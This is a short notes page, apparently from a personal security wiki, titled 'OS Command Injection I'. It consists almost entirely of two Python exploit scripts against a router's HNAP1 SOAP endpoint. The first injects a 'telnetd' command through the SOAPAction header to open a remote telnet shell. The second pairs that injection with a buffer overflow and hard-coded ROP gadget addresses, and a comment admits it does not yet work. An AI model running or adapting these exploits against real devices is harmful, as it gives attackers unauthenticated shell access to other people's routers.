+++
title = "OS Command Injection I"
date = 2021-10-18T20:39:54-06:00
weight = 5
+++


## OS Command Injection I

```python
import socket
import struct

# CSRF or any other trickery, but probably only works when connected to network I suppose

buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 99.249.143.124\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ';telnetd -p 9090;\r\n' + "1\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.1", 80))
s.send(buf)
```


or


```python
import socket
import struct


# format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address)

buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ";sh;"+"H"*286
buf+= "\x40\xF4\xB1\x2A" # (ROP gadget which puts right value in A0)
buf+= "B"*20+"ZZZZ"+"telnetd -p 6778"+"C"*5 # adjustment to get to the right payload
buf+="\xA0\xb2\xb4\x2a" # The system address is 2Ab4b200 so changing that in GDB just before jumping to test if it works which it does not
buf+= "\r\n" + "1\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("1.2.3.4", 80))
s.send(buf)
```
